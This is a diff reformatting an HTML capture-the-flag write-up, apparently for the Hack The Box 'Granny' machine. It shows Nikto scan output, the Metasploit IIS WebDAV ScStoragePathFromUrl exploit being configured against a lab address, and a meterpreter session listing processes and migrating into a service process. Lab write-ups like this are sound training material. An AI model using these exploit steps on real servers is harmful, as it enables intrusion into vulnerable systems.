@@ -73,7 +73,7 @@ categories:
 <br>+ No CGI Directories found (use '-C all' to force check all possible dirs)
 <br>+ OSVDB-397: HTTP method <font color="ffff00">'PUT'</font> allows clients to save files on the web server.
 <br>+ OSVDB-5646: HTTP method 'DELETE' allows clients to delete files on the web server.
-<br>+ Retrieved dasl header: <font color="ffff00"><DAV:sql></font>
+<br>+ Retrieved dasl header: <font color="ffff00"> <DAV:sql> </font>
 <br>+ Retrieved dav header: 1, 2
 <br>+ Retrieved ms-author-via header: MS-FP/4.0,DAV
 <br>+ Uncommon header 'ms-author-via' found, with contents: MS-FP/4.0,DAV
@@ -109,23 +109,23 @@ categories:
 
 <p>Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):</p>
 
-<p>&nbsp;&nbsp;&nbsp;Name           Current Setting  Required  Description
-<br>&nbsp;&nbsp;&nbsp;----           ---------------  --------  -----------
-<br>&nbsp;&nbsp;&nbsp;MAXPATHLENGTH  60               yes       End of physical path brute force
-<br>&nbsp;&nbsp;&nbsp;MINPATHLENGTH  3                yes       Start of physical path brute force
-<br>&nbsp;&nbsp;&nbsp;Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
-<br>&nbsp;&nbsp;&nbsp;RHOST                           yes       The target address
-<br>&nbsp;&nbsp;&nbsp;RPORT          80               yes       The target port (TCP)
-<br>&nbsp;&nbsp;&nbsp;SSL            false            no        Negotiate SSL/TLS for outgoing connections
-<br>&nbsp;&nbsp;&nbsp;TARGETURI      /                yes       Path of IIS 6 web application
-<br>&nbsp;&nbsp;&nbsp;VHOST                           no        HTTP server virtual host</p>
+<p>&nbsp;&nbsp;&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Current&nbsp;Setting&nbsp;&nbsp;Required&nbsp;&nbsp;Description
+<br>&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;---------------&nbsp;&nbsp;--------&nbsp;&nbsp;-----------
+<br>&nbsp;&nbsp;&nbsp;MAXPATHLENGTH&nbsp;&nbsp;60&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;End of physical path brute force
+<br>&nbsp;&nbsp;&nbsp;MINPATHLENGTH&nbsp;&nbsp;3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Start of physical path brute force
+<br>&nbsp;&nbsp;&nbsp;Proxies&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;no&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A proxy chain of format type:host:port[,type:host:port][...]
+<br>&nbsp;&nbsp;&nbsp;RHOST&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The target address
+<br>&nbsp;&nbsp;&nbsp;RPORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The target port (TCP)
+<br>&nbsp;&nbsp;&nbsp;SSL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;false&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;no&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Negotiate SSL/TLS for outgoing connections
+<br>&nbsp;&nbsp;&nbsp;TARGETURI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Path of IIS 6 web application
+<br>&nbsp;&nbsp;&nbsp;VHOST&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;no&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HTTP server virtual host</p>
 
 
 <p>Exploit target:</p>
 
-<p>&nbsp;&nbsp;&nbsp;Id  Name
-<br>&nbsp;&nbsp;&nbsp;--  ----
-<br>&nbsp;&nbsp;&nbsp;0   Microsoft Windows Server 2003 R2 SP2 x86</p>
+<p>&nbsp;&nbsp;&nbsp;Id&nbsp;&nbsp;Name
+<br>&nbsp;&nbsp;&nbsp;--&nbsp;&nbsp;----
+<br>&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;Microsoft Windows Server 2003 R2 SP2 x86</p>
 
 
 <p>msf exploit(<font color="red">iis_webdav_scstoragepathfromurl</font>) > set RHOST 10.10.10.15
@@ -139,13 +139,13 @@ categories:
 <p>meterpreter > getuid
 <br><font color="red">[-]</font> stdapi_sys_config_getuid: Operation failed: Access is denied.
 <br>meterpreter > sysinfo
-<br>Computer        : GRANNY
-<br>OS              : Windows .NET Server (Build 3790, Service Pack 2).
-<br>Architecture    : x86
-<br>System Language : en_US
-<br>Domain          : HTB
-<br>Logged On Users : 3
-<br>Meterpreter     : x86/windows
+<br>Computer&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;GRANNY
+<br>OS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Windows .NET Server (Build 3790, Service Pack 2).
+<br>Architecture&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;x86
+<br>System Language&nbsp;:&nbsp;en_US
+<br>Domain&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;HTB
+<br>Logged On Users&nbsp;:&nbsp;3
+<br>Meterpreter&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;x86/windows
 <br>meterpreter > </p>
 </div>
 </font>
@@ -162,37 +162,37 @@ categories:
 <p>Process List
 <br>============</p>
 
-<p>&nbsp;PID   PPID  Name              Arch  Session  User                          Path
-<br>&nbsp;---   ----  ----              ----  -------  ----                          ----
-<br>&nbsp;0     0     [System Process]                                               
-<br>&nbsp;4     0     System                                                         
-<br>&nbsp;260   4     smss.exe                                                       
-<br>&nbsp;316   260   csrss.exe                                                      
-<br>&nbsp;340   260   winlogon.exe                                                   
-<br>&nbsp;388   340   services.exe                                                   
-<br>&nbsp;400   340   lsass.exe                                                      
-<br>&nbsp;568   388   svchost.exe                                                    
-<br>&nbsp;668   388   svchost.exe                                                    
-<br>&nbsp;704   1068  cidaemon.exe                                                   
-<br>&nbsp;728   388   svchost.exe                                                    
-<br>&nbsp;756   388   svchost.exe                                                    
-<br>&nbsp;792   388   svchost.exe                                                    
-<br>&nbsp;928   388   spoolsv.exe                                                    
-<br>&nbsp;952   388   msdtc.exe                                                      
-<br>&nbsp;1068  388   cisvc.exe                                                      
-<br>&nbsp;1112  388   svchost.exe                                                    
-<br>&nbsp;1160  388   inetinfo.exe                                                   
-<br>&nbsp;1208  388   svchost.exe                                                    
-<br>&nbsp;1440  388   svchost.exe                                                    
-<br>&nbsp;1572  388   svchost.exe                                                    
-<br>&nbsp;1668  388   alg.exe                                                        
-<br>&nbsp;1772  568   wmiprvse.exe                                                   
-<br>&nbsp;1932  568   davcdata.exe      x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
-<br>&nbsp;2092  1068  cidaemon.exe                                                   
-<br>&nbsp;2124  1068  cidaemon.exe                                                   
-<br>&nbsp;2204  340   logon.scr                                                      
-<br>&nbsp;3080  1440  w3wp.exe          x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
-<br>&nbsp;3172  3080  rundll32.exe      x86   0                                      C:\WINDOWS\system32\rundll32.exe</p>
+<p>&nbsp;PID&nbsp;&nbsp;&nbsp;PPID&nbsp;&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Arch&nbsp;&nbsp;Session&nbsp;&nbsp;User&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Path
+<br>&nbsp;---&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;-------&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----
+<br>&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[System Process]                                               
+<br>&nbsp;4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System                                                         
+<br>&nbsp;260&nbsp;&nbsp;&nbsp;4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;smss.exe                                                       
+<br>&nbsp;316&nbsp;&nbsp;&nbsp;260&nbsp;&nbsp;&nbsp;csrss.exe                                                      
+<br>&nbsp;340&nbsp;&nbsp;&nbsp;260&nbsp;&nbsp;&nbsp;winlogon.exe                                                   
+<br>&nbsp;388&nbsp;&nbsp;&nbsp;340&nbsp;&nbsp;&nbsp;services.exe                                                   
+<br>&nbsp;400&nbsp;&nbsp;&nbsp;340&nbsp;&nbsp;&nbsp;lsass.exe                                                      
+<br>&nbsp;568&nbsp;&nbsp;&nbsp;388&nbsp;&nbsp;&nbsp;svchost.exe                                                    
+<br>&nbsp;668&nbsp;&nbsp;&nbsp;388&nbsp;&nbsp;&nbsp;svchost.exe                                                    
+<br>&nbsp;704&nbsp;&nbsp;&nbsp;1068&nbsp;&nbsp;cidaemon.exe                                                   
+<br>&nbsp;728&nbsp;&nbsp;&nbsp;388&nbsp;&nbsp;&nbsp;svchost.exe                                                    
+<br>&nbsp;756&nbsp;&nbsp;&nbsp;388&nbsp;&nbsp;&nbsp;svchost.exe                                                    
+<br>&nbsp;792&nbsp;&nbsp;&nbsp;388&nbsp;&nbsp;&nbsp;svchost.exe                                                    
+<br>&nbsp;928&nbsp;&nbsp;&nbsp;388&nbsp;&nbsp;&nbsp;spoolsv.exe                                                    
+<br>&nbsp;952&nbsp;&nbsp;&nbsp;388&nbsp;&nbsp;&nbsp;msdtc.exe                                                      
+<br>&nbsp;1068&nbsp;&nbsp;388&nbsp;&nbsp;&nbsp;cisvc.exe                                                      
+<br>&nbsp;1112&nbsp;&nbsp;388&nbsp;&nbsp;&nbsp;svchost.exe                                                    
+<br>&nbsp;1160&nbsp;&nbsp;388&nbsp;&nbsp;&nbsp;inetinfo.exe                                                   
+<br>&nbsp;1208&nbsp;&nbsp;388&nbsp;&nbsp;&nbsp;svchost.exe                                                    
+<br>&nbsp;1440&nbsp;&nbsp;388&nbsp;&nbsp;&nbsp;svchost.exe                                                    
+<br>&nbsp;1572&nbsp;&nbsp;388&nbsp;&nbsp;&nbsp;svchost.exe                                                    
+<br>&nbsp;1668&nbsp;&nbsp;388&nbsp;&nbsp;&nbsp;alg.exe                                                        
+<br>&nbsp;1772&nbsp;&nbsp;568&nbsp;&nbsp;&nbsp;wmiprvse.exe                                                   
+<br>&nbsp;1932&nbsp;&nbsp;568&nbsp;&nbsp;&nbsp;davcdata.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT AUTHORITY\NETWORK SERVICE&nbsp;&nbsp;C:\WINDOWS\system32\inetsrv\davcdata.exe
+<br>&nbsp;2092&nbsp;&nbsp;1068&nbsp;&nbsp;cidaemon.exe                                                   
+<br>&nbsp;2124&nbsp;&nbsp;1068&nbsp;&nbsp;cidaemon.exe                                                   
+<br>&nbsp;2204&nbsp;&nbsp;340&nbsp;&nbsp;&nbsp;logon.scr                                                      
+<br>&nbsp;3080&nbsp;&nbsp;1440&nbsp;&nbsp;w3wp.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT AUTHORITY\NETWORK SERVICE&nbsp;&nbsp;c:\windows\system32\inetsrv\w3wp.exe
+<br>&nbsp;3172&nbsp;&nbsp;3080&nbsp;&nbsp;rundll32.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:\WINDOWS\system32\rundll32.exe</p>
 
 <p>meterpreter > migrate 1932
 <br><font color="RoyalBlue">[*]</font> Migrating from 3172 to 1932...
